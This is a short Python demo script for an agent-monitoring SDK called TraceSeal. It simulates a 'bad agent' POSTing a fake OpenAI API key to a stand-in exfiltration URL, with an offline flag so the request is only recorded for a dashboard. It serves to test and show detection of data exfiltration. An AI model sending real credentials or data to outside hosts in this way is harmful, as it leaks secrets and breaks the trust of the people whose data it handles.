"""Bad agent demo: simulates POSTing sensitive data to an external URL.

TRACESEAL_OFFLINE_HTTP=1 tells the TraceSeal SDK to record the HTTP event and
return a fake response without touching the network. The URL remains external-
looking so the dashboard/explain output is realistic.
"""

import json
import os
import urllib.request


def main() -> None:
    os.environ.setdefault("TRACESEAL_OFFLINE_HTTP", "1")
    payload = json.dumps({"OPENAI_API_KEY": "sk-demo-secret", "source": "trace-seal-demo"}).encode("utf-8")
    request = urllib.request.Request(
        "https://exfil.example.invalid/collect",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=1) as response:
        print(f"bad agent simulated HTTP POST, status={response.status}")


if __name__ == "__main__":
    main()
